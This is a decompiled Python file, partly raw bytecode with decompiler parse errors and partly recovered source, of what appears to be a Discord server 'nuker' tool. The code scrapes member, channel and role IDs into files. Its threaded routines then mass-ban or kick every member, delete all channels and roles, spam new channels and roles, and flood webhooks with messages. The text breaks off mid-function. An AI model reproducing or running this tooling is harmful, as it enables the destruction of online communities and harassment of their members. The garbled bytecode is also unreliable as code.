               62  LOAD_ATTR                gray
               64  FORMAT_VALUE          0  ''
               66  LOAD_GLOBAL              Fore
               68  LOAD_ATTR                GREEN
               70  FORMAT_VALUE          0  ''
               72  LOAD_STR                 '√'
               74  LOAD_GLOBAL              Fore
               76  LOAD_ATTR                GREEN
               78  FORMAT_VALUE          0  ''
               80  LOAD_GLOBAL              colors
               82  LOAD_ATTR                gray
               84  FORMAT_VALUE          0  ''
               86  LOAD_STR                 ']'
               88  LOAD_GLOBAL              colors
               90  LOAD_ATTR                gray
               92  FORMAT_VALUE          0  ''
               94  LOAD_STR                 ' '
               96  LOAD_GLOBAL              Fore
               98  LOAD_ATTR                LIGHTBLACK_EX
              100  FORMAT_VALUE          0  ''
              102  LOAD_STR                 '· '
              104  LOAD_GLOBAL              colors
              106  LOAD_ATTR                gray
              108  FORMAT_VALUE          0  ''
              110  LOAD_STR                 '['
              112  LOAD_GLOBAL              colors
              114  LOAD_ATTR                gray
              116  FORMAT_VALUE          0  ''
              118  LOAD_GLOBAL              Fore
              120  LOAD_ATTR                LIGHTBLACK_EX
              122  FORMAT_VALUE          0  ''
              124  LOAD_GLOBAL              ok
              126  FORMAT_VALUE          0  ''
              128  LOAD_GLOBAL              Fore
              130  LOAD_ATTR                LIGHTBLACK_EX
              132  FORMAT_VALUE          0  ''
              134  LOAD_GLOBAL              colors
              136  LOAD_ATTR                gray
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 '] '
              142  LOAD_GLOBAL              colors
              144  LOAD_ATTR                gray
              146  FORMAT_VALUE          0  ''
              148  LOAD_STR                 '['
              150  LOAD_GLOBAL              colors
              152  LOAD_ATTR                gray
              154  FORMAT_VALUE          0  ''
              156  LOAD_GLOBAL              Fore
              158  LOAD_ATTR                LIGHTBLACK_EX
              160  FORMAT_VALUE          0  ''
              162  LOAD_STR                 'Client'
              164  LOAD_GLOBAL              Fore
              166  LOAD_ATTR                LIGHTBLACK_EX
              168  FORMAT_VALUE          0  ''
              170  LOAD_GLOBAL              colors
              172  LOAD_ATTR                gray
              174  FORMAT_VALUE          0  ''
              176  LOAD_STR                 '] '
              178  LOAD_GLOBAL              Fore
              180  LOAD_ATTR                LIGHTBLACK_EX
              182  FORMAT_VALUE          0  ''
              184  LOAD_STR                 ' punished client created webhook'
              186  BUILD_STRING_30      30 
              188  CALL_FUNCTION_1       1  ''
              190  POP_TOP          

 L. 341       192  LOAD_FAST                'web_urls'
              194  LOAD_METHOD              append
              196  LOAD_FAST                'webhook'
              198  LOAD_ATTR                url
              200  CALL_METHOD_1         1  ''
              202  POP_TOP          
              204  POP_BLOCK        
              206  JUMP_BACK            24  'to 24'
            208_0  COME_FROM_FINALLY    28  '28'

 L. 342       208  DUP_TOP          
              210  LOAD_GLOBAL              Exception
              212  <121>               250  ''
              214  POP_TOP          
              216  STORE_FAST               'e'
              218  POP_TOP          
              220  SETUP_FINALLY       242  'to 242'

 L. 343       222  LOAD_GLOBAL              print
              224  LOAD_FAST                'e'
              226  CALL_FUNCTION_1       1  ''
              228  POP_TOP          
              230  POP_BLOCK        
              232  POP_EXCEPT       
              234  LOAD_CONST               None
              236  STORE_FAST               'e'
              238  DELETE_FAST              'e'
              240  JUMP_BACK            24  'to 24'
            242_0  COME_FROM_FINALLY   220  '220'
              242  LOAD_CONST               None
              244  STORE_FAST               'e'
              246  DELETE_FAST              'e'
              248  <48>             
              250  <48>             
              252  JUMP_BACK            24  'to 24'
            254_0  COME_FROM            24  '24'

 L. 344       254  LOAD_FAST                'web_urls'
              256  GET_ITER         
            258_0  COME_FROM           354  '354'
              258  FOR_ITER            358  'to 358'
              260  STORE_FAST               'url'

 L. 345       262  LOAD_GLOBAL              range
              264  LOAD_FAST                'amount'
              266  CALL_FUNCTION_1       1  ''
              268  GET_ITER         
            270_0  COME_FROM           350  '350'
            270_1  COME_FROM           338  '338'
            270_2  COME_FROM           302  '302'
              270  FOR_ITER            354  'to 354'
              272  STORE_FAST               'i'

 L. 346       274  SETUP_FINALLY       304  'to 304'

 L. 347       276  LOAD_GLOBAL              threading
              278  LOAD_ATTR                Thread
              280  LOAD_FAST                'self'
              282  LOAD_ATTR                WebhookSend
              284  LOAD_FAST                'url'
              286  LOAD_FAST                'message'
              288  BUILD_TUPLE_2         2 
              290  LOAD_CONST               ('target', 'args')
              292  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              294  LOAD_METHOD              start
              296  CALL_METHOD_0         0  ''
              298  POP_TOP          
              300  POP_BLOCK        
              302  JUMP_BACK           270  'to 270'
            304_0  COME_FROM_FINALLY   274  '274'

 L. 348       304  DUP_TOP          
              306  LOAD_GLOBAL              Exception
          308_310  <121>               348  ''
              312  POP_TOP          
              314  STORE_FAST               'e'
              316  POP_TOP          
              318  SETUP_FINALLY       340  'to 340'

 L. 349       320  LOAD_GLOBAL              print
              322  LOAD_FAST                'e'
              324  CALL_FUNCTION_1       1  ''
              326  POP_TOP          
              328  POP_BLOCK        
              330  POP_EXCEPT       
              332  LOAD_CONST               None
              334  STORE_FAST               'e'
              336  DELETE_FAST              'e'
              338  JUMP_BACK           270  'to 270'
            340_0  COME_FROM_FINALLY   318  '318'
              340  LOAD_CONST               None
              342  STORE_FAST               'e'
              344  DELETE_FAST              'e'
              346  <48>             
              348  <48>             
          350_352  JUMP_BACK           270  'to 270'
            354_0  COME_FROM           270  '270'
          354_356  JUMP_BACK           258  'to 258'
            358_0  COME_FROM           258  '258'

Parse error at or near `<121>' instruction at offset 212

    async def Scrape--- This code section failed: ---

 L. 356         0  LOAD_GLOBAL              input
                2  LOAD_GLOBAL              colors
                4  LOAD_ATTR                gray
                6  FORMAT_VALUE          0  ''
                8  LOAD_STR                 '['
               10  LOAD_GLOBAL              colors
               12  LOAD_ATTR                gray
               14  FORMAT_VALUE          0  ''
               16  LOAD_GLOBAL              Fore
               18  LOAD_ATTR                GREEN
               20  FORMAT_VALUE          0  ''
               22  LOAD_STR                 '√'
               24  LOAD_GLOBAL              Fore
               26  LOAD_ATTR                GREEN
               28  FORMAT_VALUE          0  ''
               30  LOAD_GLOBAL              colors
               32  LOAD_ATTR                gray
               34  FORMAT_VALUE          0  ''
               36  LOAD_STR                 ']'
               38  LOAD_GLOBAL              colors
               40  LOAD_ATTR                gray
               42  FORMAT_VALUE          0  ''
               44  LOAD_STR                 ' '
               46  LOAD_GLOBAL              Fore
               48  LOAD_ATTR                LIGHTBLACK_EX
               50  FORMAT_VALUE          0  ''
               52  LOAD_STR                 '· '
               54  LOAD_GLOBAL              colors
               56  LOAD_ATTR                gray
               58  FORMAT_VALUE          0  ''
               60  LOAD_STR                 '['
               62  LOAD_GLOBAL              colors
               64  LOAD_ATTR                gray
               66  FORMAT_VALUE          0  ''
               68  LOAD_GLOBAL              Fore
               70  LOAD_ATTR                LIGHTBLACK_EX
               72  FORMAT_VALUE          0  ''
               74  LOAD_GLOBAL              ok
               76  FORMAT_VALUE          0  ''
               78  LOAD_GLOBAL              Fore
               80  LOAD_ATTR                LIGHTBLACK_EX
               82  FORMAT_VALUE          0  ''
               84  LOAD_GLOBAL              colors
               86  LOAD_ATTR                gray
               88  FORMAT_VALUE          0  ''
               90  LOAD_STR                 '] '
               92  LOAD_GLOBAL              colors
               94  LOAD_ATTR                gray
               96  FORMAT_VALUE          0  ''
               98  LOAD_STR                 '['
              100  LOAD_GLOBAL              colors
              102  LOAD_ATTR                gray
              104  FORMAT_VALUE          0  ''
              106  LOAD_GLOBAL              Fore
              108  LOAD_ATTR                LIGHTBLACK_EX
              110  FORMAT_VALUE          0  ''
              112  LOAD_STR                 'Client'
              114  LOAD_GLOBAL              Fore
              116  LOAD_ATTR                LIGHTBLACK_EX
              118  FORMAT_VALUE          0  ''
              120  LOAD_GLOBAL              colors
              122  LOAD_ATTR                gray
              124  FORMAT_VALUE          0  ''
              126  LOAD_STR                 '] '
              128  LOAD_GLOBAL              Fore
              130  LOAD_ATTR                LIGHTBLACK_EX
              132  FORMAT_VALUE          0  ''
              134  LOAD_STR                 ' Server Id: '
              136  LOAD_GLOBAL              Fore
              138  LOAD_ATTR                GREEN
              140  FORMAT_VALUE          0  ''
              142  BUILD_STRING_31      31 
              144  CALL_FUNCTION_1       1  ''
              146  STORE_FAST               'guild'

 L. 357       148  LOAD_GLOBAL              client
              150  LOAD_METHOD              wait_until_ready
              152  CALL_METHOD_0         0  ''
              154  GET_AWAITABLE    
              156  LOAD_CONST               None
              158  YIELD_FROM       
              160  POP_TOP          

 L. 358       162  LOAD_GLOBAL              client
              164  LOAD_METHOD              get_guild
              166  LOAD_GLOBAL              int
              168  LOAD_FAST                'guild'
              170  CALL_FUNCTION_1       1  ''
              172  CALL_METHOD_1         1  ''
              174  STORE_FAST               'guildOBJ'

 L. 359       176  LOAD_FAST                'guildOBJ'
              178  LOAD_METHOD              chunk
              180  CALL_METHOD_0         0  ''
              182  GET_AWAITABLE    
              184  LOAD_CONST               None
              186  YIELD_FROM       
              188  STORE_FAST               'members'

 L. 361       190  SETUP_FINALLY       226  'to 226'

 L. 362       192  LOAD_GLOBAL              os
              194  LOAD_METHOD              remove
              196  LOAD_STR                 'Scraped/members.txt'
              198  CALL_METHOD_1         1  ''
              200  POP_TOP          

 L. 363       202  LOAD_GLOBAL              os
              204  LOAD_METHOD              remove
              206  LOAD_STR                 'Scraped/channels.txt'
              208  CALL_METHOD_1         1  ''
              210  POP_TOP          

 L. 364       212  LOAD_GLOBAL              os
              214  LOAD_METHOD              remove
              216  LOAD_STR                 'Scraped/roles.txt'
              218  CALL_METHOD_1         1  ''
              220  POP_TOP          
              222  POP_BLOCK        
              224  JUMP_FORWARD        238  'to 238'
            226_0  COME_FROM_FINALLY   190  '190'

 L. 365       226  POP_TOP          
              228  POP_TOP          
              230  POP_TOP          

 L. 366       232  POP_EXCEPT       
              234  JUMP_FORWARD        238  'to 238'
              236  <48>             
            238_0  COME_FROM           234  '234'
            238_1  COME_FROM           224  '224'

 L. 368       238  LOAD_CONST               0
              240  STORE_FAST               'membercount'

 L. 369       242  LOAD_GLOBAL              open
              244  LOAD_STR                 'Scraped/members.txt'
              246  LOAD_STR                 'a'
              248  CALL_FUNCTION_2       2  ''
              250  SETUP_WITH          480  'to 480'
              252  STORE_FAST               'm'

 L. 370       254  LOAD_FAST                'members'
              256  GET_ITER         
            258_0  COME_FROM           290  '290'
              258  FOR_ITER            294  'to 294'
              260  STORE_FAST               'member'

 L. 371       262  LOAD_FAST                'm'
              264  LOAD_METHOD              write
              266  LOAD_GLOBAL              str
              268  LOAD_FAST                'member'
              270  LOAD_ATTR                id
              272  CALL_FUNCTION_1       1  ''
              274  LOAD_STR                 '\n'
              276  BINARY_ADD       
              278  CALL_METHOD_1         1  ''
              280  POP_TOP          

 L. 372       282  LOAD_FAST                'membercount'
              284  LOAD_CONST               1
              286  INPLACE_ADD      
              288  STORE_FAST               'membercount'
          290_292  JUMP_BACK           258  'to 258'
            294_0  COME_FROM           258  '258'

 L. 373       294  LOAD_GLOBAL              print
              296  LOAD_STR                 '\n'
              298  LOAD_GLOBAL              colors
              300  LOAD_ATTR                gray
              302  FORMAT_VALUE          0  ''
              304  LOAD_STR                 '['
              306  LOAD_GLOBAL              colors
              308  LOAD_ATTR                gray
              310  FORMAT_VALUE          0  ''
              312  LOAD_GLOBAL              Fore
              314  LOAD_ATTR                GREEN
              316  FORMAT_VALUE          0  ''
              318  LOAD_STR                 '√'
              320  LOAD_GLOBAL              Fore
              322  LOAD_ATTR                GREEN
              324  FORMAT_VALUE          0  ''
              326  LOAD_GLOBAL              colors
              328  LOAD_ATTR                gray
              330  FORMAT_VALUE          0  ''
              332  LOAD_STR                 ']'
              334  LOAD_GLOBAL              colors
              336  LOAD_ATTR                gray
              338  FORMAT_VALUE          0  ''
              340  LOAD_STR                 ' '
              342  LOAD_GLOBAL              Fore
              344  LOAD_ATTR                LIGHTBLACK_EX
              346  FORMAT_VALUE          0  ''
              348  LOAD_STR                 '· '
              350  LOAD_GLOBAL              colors
              352  LOAD_ATTR                gray
              354  FORMAT_VALUE          0  ''
              356  LOAD_STR                 '['
              358  LOAD_GLOBAL              colors
              360  LOAD_ATTR                gray
              362  FORMAT_VALUE          0  ''
              364  LOAD_GLOBAL              Fore
              366  LOAD_ATTR                LIGHTBLACK_EX
              368  FORMAT_VALUE          0  ''
              370  LOAD_GLOBAL              ok
              372  FORMAT_VALUE          0  ''
              374  LOAD_GLOBAL              Fore
              376  LOAD_ATTR                LIGHTBLACK_EX
              378  FORMAT_VALUE          0  ''
              380  LOAD_GLOBAL              colors
              382  LOAD_ATTR                gray
              384  FORMAT_VALUE          0  ''
              386  LOAD_STR                 '] '
              388  LOAD_GLOBAL              colors
              390  LOAD_ATTR                gray
              392  FORMAT_VALUE          0  ''
              394  LOAD_STR                 '['
              396  LOAD_GLOBAL              colors
              398  LOAD_ATTR                gray
              400  FORMAT_VALUE          0  ''
              402  LOAD_GLOBAL              Fore
              404  LOAD_ATTR                LIGHTBLACK_EX
              406  FORMAT_VALUE          0  ''
              408  LOAD_STR                 'Client'
              410  LOAD_GLOBAL              Fore
              412  LOAD_ATTR                LIGHTBLACK_EX
              414  FORMAT_VALUE          0  ''
              416  LOAD_GLOBAL              colors
              418  LOAD_ATTR                gray
              420  FORMAT_VALUE          0  ''
              422  LOAD_STR                 '] '
              424  LOAD_GLOBAL              Fore
              426  LOAD_ATTR                LIGHTBLACK_EX
              428  FORMAT_VALUE          0  ''
              430  LOAD_STR                 ' Scrapped '
              432  LOAD_GLOBAL              Fore
              434  LOAD_ATTR                LIGHTCYAN_EX
              436  FORMAT_VALUE          0  ''
              438  LOAD_STR                 ' '
              440  LOAD_GLOBAL              Fore
              442  LOAD_ATTR                GREEN
              444  FORMAT_VALUE          0  ''
              446  LOAD_FAST                'membercount'
              448  FORMAT_VALUE          0  ''
              450  LOAD_STR                 ' Members'
              452  BUILD_STRING_36      36 
              454  CALL_FUNCTION_1       1  ''
              456  POP_TOP          

 L. 374       458  LOAD_FAST                'm'
              460  LOAD_METHOD              close
              462  CALL_METHOD_0         0  ''
              464  POP_TOP          
              466  POP_BLOCK        
              468  LOAD_CONST               None
              470  DUP_TOP          
              472  DUP_TOP          
              474  CALL_FUNCTION_3       3  ''
              476  POP_TOP          
              478  JUMP_FORWARD        498  'to 498'
            480_0  COME_FROM_WITH      250  '250'
              480  <49>             
          482_484  POP_JUMP_IF_TRUE    488  'to 488'
              486  <48>             
            488_0  COME_FROM           482  '482'
              488  POP_TOP          
              490  POP_TOP          
              492  POP_TOP          
              494  POP_EXCEPT       
              496  POP_TOP          
            498_0  COME_FROM           478  '478'

 L. 376       498  LOAD_CONST               0
              500  STORE_FAST               'channelcount'

 L. 377       502  LOAD_GLOBAL              open
              504  LOAD_STR                 'Scraped/channels.txt'
              506  LOAD_STR                 'a'
              508  CALL_FUNCTION_2       2  ''
              510  SETUP_WITH          740  'to 740'
              512  STORE_FAST               'c'

 L. 378       514  LOAD_FAST                'guildOBJ'
              516  LOAD_ATTR                channels
              518  GET_ITER         
            520_0  COME_FROM           552  '552'
              520  FOR_ITER            556  'to 556'
              522  STORE_FAST               'channel'

 L. 379       524  LOAD_FAST                'c'
              526  LOAD_METHOD              write
              528  LOAD_GLOBAL              str
              530  LOAD_FAST                'channel'
              532  LOAD_ATTR                id
              534  CALL_FUNCTION_1       1  ''
              536  LOAD_STR                 '\n'
              538  BINARY_ADD       
              540  CALL_METHOD_1         1  ''
              542  POP_TOP          

 L. 380       544  LOAD_FAST                'channelcount'
              546  LOAD_CONST               1
              548  INPLACE_ADD      
              550  STORE_FAST               'channelcount'
          552_554  JUMP_BACK           520  'to 520'
            556_0  COME_FROM           520  '520'

 L. 381       556  LOAD_GLOBAL              print
              558  LOAD_GLOBAL              colors
              560  LOAD_ATTR                gray
              562  FORMAT_VALUE          0  ''
              564  LOAD_STR                 '['
              566  LOAD_GLOBAL              colors
              568  LOAD_ATTR                gray
              570  FORMAT_VALUE          0  ''
              572  LOAD_GLOBAL              Fore
              574  LOAD_ATTR                GREEN
              576  FORMAT_VALUE          0  ''
              578  LOAD_STR                 '√'
              580  LOAD_GLOBAL              Fore
              582  LOAD_ATTR                GREEN
              584  FORMAT_VALUE          0  ''
              586  LOAD_GLOBAL              colors
              588  LOAD_ATTR                gray
              590  FORMAT_VALUE          0  ''
              592  LOAD_STR                 ']'
              594  LOAD_GLOBAL              colors
              596  LOAD_ATTR                gray
              598  FORMAT_VALUE          0  ''
              600  LOAD_STR                 ' '
              602  LOAD_GLOBAL              Fore
              604  LOAD_ATTR                LIGHTBLACK_EX
              606  FORMAT_VALUE          0  ''
              608  LOAD_STR                 '· '
              610  LOAD_GLOBAL              colors
              612  LOAD_ATTR                gray
              614  FORMAT_VALUE          0  ''
              616  LOAD_STR                 '['
              618  LOAD_GLOBAL              colors
              620  LOAD_ATTR                gray
              622  FORMAT_VALUE          0  ''
              624  LOAD_GLOBAL              Fore
              626  LOAD_ATTR                LIGHTBLACK_EX
              628  FORMAT_VALUE          0  ''
              630  LOAD_GLOBAL              ok
              632  FORMAT_VALUE          0  ''
              634  LOAD_GLOBAL              Fore
              636  LOAD_ATTR                LIGHTBLACK_EX
              638  FORMAT_VALUE          0  ''
              640  LOAD_GLOBAL              colors
              642  LOAD_ATTR                gray
              644  FORMAT_VALUE          0  ''
              646  LOAD_STR                 '] '
              648  LOAD_GLOBAL              colors
              650  LOAD_ATTR                gray
              652  FORMAT_VALUE          0  ''
              654  LOAD_STR                 '['
              656  LOAD_GLOBAL              colors
              658  LOAD_ATTR                gray
              660  FORMAT_VALUE          0  ''
              662  LOAD_GLOBAL              Fore
              664  LOAD_ATTR                LIGHTBLACK_EX
              666  FORMAT_VALUE          0  ''
              668  LOAD_STR                 'Client'
              670  LOAD_GLOBAL              Fore
              672  LOAD_ATTR                LIGHTBLACK_EX
              674  FORMAT_VALUE          0  ''
              676  LOAD_GLOBAL              colors
              678  LOAD_ATTR                gray
              680  FORMAT_VALUE          0  ''
              682  LOAD_STR                 '] '
              684  LOAD_GLOBAL              Fore
              686  LOAD_ATTR                LIGHTBLACK_EX
              688  FORMAT_VALUE          0  ''
              690  LOAD_STR                 ' Scrapped '
              692  LOAD_GLOBAL              Fore
              694  LOAD_ATTR                LIGHTCYAN_EX
              696  FORMAT_VALUE          0  ''
              698  LOAD_STR                 ' '
              700  LOAD_GLOBAL              Fore
              702  LOAD_ATTR                GREEN
              704  FORMAT_VALUE          0  ''
              706  LOAD_FAST                'channelcount'
              708  FORMAT_VALUE          0  ''
              710  LOAD_STR                 ' Channels'
              712  BUILD_STRING_35      35 
              714  CALL_FUNCTION_1       1  ''
              716  POP_TOP          

 L. 382       718  LOAD_FAST                'c'
              720  LOAD_METHOD              close
              722  CALL_METHOD_0         0  ''
              724  POP_TOP          
              726  POP_BLOCK        
              728  LOAD_CONST               None
              730  DUP_TOP          
              732  DUP_TOP          
              734  CALL_FUNCTION_3       3  ''
              736  POP_TOP          
              738  JUMP_FORWARD        758  'to 758'
            740_0  COME_FROM_WITH      510  '510'
              740  <49>             
          742_744  POP_JUMP_IF_TRUE    748  'to 748'
              746  <48>             
            748_0  COME_FROM           742  '742'
              748  POP_TOP          
              750  POP_TOP          
              752  POP_TOP          
              754  POP_EXCEPT       
              756  POP_TOP          
            758_0  COME_FROM           738  '738'

 L. 384       758  LOAD_CONST               0
              760  STORE_FAST               'rolecount'

 L. 385       762  LOAD_GLOBAL              open
              764  LOAD_STR                 'Scraped/roles.txt'
              766  LOAD_STR                 'a'
              768  CALL_FUNCTION_2       2  ''
              770  SETUP_WITH         1000  'to 1000'
              772  STORE_FAST               'r'

 L. 386       774  LOAD_FAST                'guildOBJ'
              776  LOAD_ATTR                roles
              778  GET_ITER         
            780_0  COME_FROM           812  '812'
              780  FOR_ITER            816  'to 816'
              782  STORE_FAST               'role'

 L. 387       784  LOAD_FAST                'r'
              786  LOAD_METHOD              write
              788  LOAD_GLOBAL              str
              790  LOAD_FAST                'role'
              792  LOAD_ATTR                id
              794  CALL_FUNCTION_1       1  ''
              796  LOAD_STR                 '\n'
              798  BINARY_ADD       
              800  CALL_METHOD_1         1  ''
              802  POP_TOP          

 L. 388       804  LOAD_FAST                'rolecount'
              806  LOAD_CONST               1
              808  INPLACE_ADD      
              810  STORE_FAST               'rolecount'
          812_814  JUMP_BACK           780  'to 780'
            816_0  COME_FROM           780  '780'

 L. 389       816  LOAD_GLOBAL              print
              818  LOAD_GLOBAL              colors
              820  LOAD_ATTR                gray
              822  FORMAT_VALUE          0  ''
              824  LOAD_STR                 '['
              826  LOAD_GLOBAL              colors
              828  LOAD_ATTR                gray
              830  FORMAT_VALUE          0  ''
              832  LOAD_GLOBAL              Fore
              834  LOAD_ATTR                GREEN
              836  FORMAT_VALUE          0  ''
              838  LOAD_STR                 '√'
              840  LOAD_GLOBAL              Fore
              842  LOAD_ATTR                GREEN
              844  FORMAT_VALUE          0  ''
              846  LOAD_GLOBAL              colors
              848  LOAD_ATTR                gray
              850  FORMAT_VALUE          0  ''
              852  LOAD_STR                 ']'
              854  LOAD_GLOBAL              colors
              856  LOAD_ATTR                gray
              858  FORMAT_VALUE          0  ''
              860  LOAD_STR                 ' '
              862  LOAD_GLOBAL              Fore
              864  LOAD_ATTR                LIGHTBLACK_EX
              866  FORMAT_VALUE          0  ''
              868  LOAD_STR                 '· '
              870  LOAD_GLOBAL              colors
              872  LOAD_ATTR                gray
              874  FORMAT_VALUE          0  ''
              876  LOAD_STR                 '['
              878  LOAD_GLOBAL              colors
              880  LOAD_ATTR                gray
              882  FORMAT_VALUE          0  ''
              884  LOAD_GLOBAL              Fore
              886  LOAD_ATTR                LIGHTBLACK_EX
              888  FORMAT_VALUE          0  ''
              890  LOAD_GLOBAL              ok
              892  FORMAT_VALUE          0  ''
              894  LOAD_GLOBAL              Fore
              896  LOAD_ATTR                LIGHTBLACK_EX
              898  FORMAT_VALUE          0  ''
              900  LOAD_GLOBAL              colors
              902  LOAD_ATTR                gray
              904  FORMAT_VALUE          0  ''
              906  LOAD_STR                 '] '
              908  LOAD_GLOBAL              colors
              910  LOAD_ATTR                gray
              912  FORMAT_VALUE          0  ''
              914  LOAD_STR                 '['
              916  LOAD_GLOBAL              colors
              918  LOAD_ATTR                gray
              920  FORMAT_VALUE          0  ''
              922  LOAD_GLOBAL              Fore
              924  LOAD_ATTR                LIGHTBLACK_EX
              926  FORMAT_VALUE          0  ''
              928  LOAD_STR                 'Client'
              930  LOAD_GLOBAL              Fore
              932  LOAD_ATTR                LIGHTBLACK_EX
              934  FORMAT_VALUE          0  ''
              936  LOAD_GLOBAL              colors
              938  LOAD_ATTR                gray
              940  FORMAT_VALUE          0  ''
              942  LOAD_STR                 '] '
              944  LOAD_GLOBAL              Fore
              946  LOAD_ATTR                LIGHTBLACK_EX
              948  FORMAT_VALUE          0  ''
              950  LOAD_STR                 ' Scrapped '
              952  LOAD_GLOBAL              Fore
              954  LOAD_ATTR                LIGHTCYAN_EX
              956  FORMAT_VALUE          0  ''
              958  LOAD_STR                 ' '
              960  LOAD_GLOBAL              Fore
              962  LOAD_ATTR                GREEN
              964  FORMAT_VALUE          0  ''
              966  LOAD_FAST                'rolecount'
              968  FORMAT_VALUE          0  ''
              970  LOAD_STR                 ' Roles'
              972  BUILD_STRING_35      35 
              974  CALL_FUNCTION_1       1  ''
              976  POP_TOP          

 L. 390       978  LOAD_FAST                'r'
              980  LOAD_METHOD              close
              982  CALL_METHOD_0         0  ''
              984  POP_TOP          
              986  POP_BLOCK        
              988  LOAD_CONST               None
              990  DUP_TOP          
              992  DUP_TOP          
              994  CALL_FUNCTION_3       3  ''
              996  POP_TOP          
              998  JUMP_FORWARD       1018  'to 1018'
           1000_0  COME_FROM_WITH      770  '770'
             1000  <49>             
         1002_1004  POP_JUMP_IF_TRUE   1008  'to 1008'
             1006  <48>             
           1008_0  COME_FROM          1002  '1002'
             1008  POP_TOP          
             1010  POP_TOP          
             1012  POP_TOP          
             1014  POP_EXCEPT       
             1016  POP_TOP          
           1018_0  COME_FROM           998  '998'

Parse error at or near `<48>' instruction at offset 236

    async def NukeExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        channel_name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Channels Name: {Fore.GREEN}")
        channel_amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        role_name = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Roles Name: {Fore.GREEN}")
        role_amount = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()
        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')
        for member in members:
            threading.Thread(target=(self.BanMembers), args=(guild, member)).start()
        else:
            for channel in channels:
                threading.Thread(target=(self.DeleteChannels), args=(guild, channel)).start()
            else:
                for role in roles:
                    threading.Thread(target=(self.DeleteRoles), args=(guild, role)).start()
                else:
                    for i in range(int(channel_amount)):
                        threading.Thread(target=(self.SpamChannels), args=(guild, channel_name)).start()
                    else:
                        for i in range(int(role_amount)):
                            threading.Thread(target=(self.SpamRoles), args=(guild, role_name)).start()
                        else:
                            members.close()
                            channels.close()
                            roles.close()

    async def BanExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=(self.BanMembers), args=(guild, member)).start()
        else:
            members.close()

    async def KickExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=(self.KickMembers), args=(guild, member)).start()
        else:
            members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=(self.DeleteChannels), args=(guild, channel)).start()
        else:
            channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.LIGHTBLACK_EX}· {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{colors.gray}] {colors.gray}[{colors.gray}{Fore.LIGHTBLACK_EX}Client{Fore.LIGHTBLACK_EX}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}")
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=(self.DeleteRoles), args=(guild, role)).start()
        else:
